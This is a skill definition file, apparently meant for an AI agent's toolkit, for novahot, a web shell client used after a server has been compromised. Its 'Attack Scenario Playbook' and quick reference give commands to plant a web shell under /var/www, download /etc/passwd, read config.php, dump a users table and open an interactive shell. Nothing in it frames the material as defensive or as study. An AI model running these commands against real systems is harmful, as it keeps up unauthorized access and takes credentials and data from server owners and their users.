---
name: novahot-web-shell
description: "Unified post-WebShell operations. Signals: webshell, rce, upload WebShell, download files, execute commands."
zh-signals: "novahot: 获 WebShell 后统一操作。信号:webshell,rce,上传 WebShell,下载文件,执行命令。"
when-to-use: >-
  Use after obtaining a web shell when you need a unified CLI to upload or download
  files, execute commands, and query databases across PHP/ASP/ASPX payloads.
---

# novahot

- Attack Category: C13 WebShell and Persistence
- Upstream Repository: https://github.com/chrisallenlane/novahot
- Upstream License: BSD-3-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
npm install -g novahot
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `novahot upload ./shell.php /var/www/shell.php` | Upload a WebShell |
| `novahot download /etc/passwd ./passwd.txt` | Download a file |
| `novahot exec 'id'` | Execute a command |
| `novahot mysql 'SELECT * FROM users'` | Built-in database client |
| `novahot shell` | Interactive shell |

## Attack Scenario Playbook

### Unified Operations After Obtaining a WebShell

```bash
novahot upload webshell.php /var/www/html/s.php
novahot exec 'cat /var/www/html/config.php'
# Unified CLI management for multiple payload types (php/asp/aspx)
```

## Notes

Cross-platform WebShell client (Node.js), supports PHP/ASP/ASPX payloads, combining command execution, file transfer, and database access.
